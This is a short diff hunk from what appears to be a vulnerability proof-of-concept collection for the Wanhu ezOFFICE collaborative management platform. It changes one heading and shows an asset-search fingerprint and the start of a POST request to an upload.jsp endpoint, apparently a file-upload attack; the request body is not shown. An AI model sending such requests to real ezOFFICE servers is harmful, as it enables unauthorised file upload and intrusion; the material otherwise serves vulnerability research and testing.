@@ -5,7 +5,7 @@
 app="万户ezOFFICE协同管理平台"
 ```
 
-## poc
+## POC
 ```
 POST /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=123&path=abc HTTP/1.1
 Host: your-ip
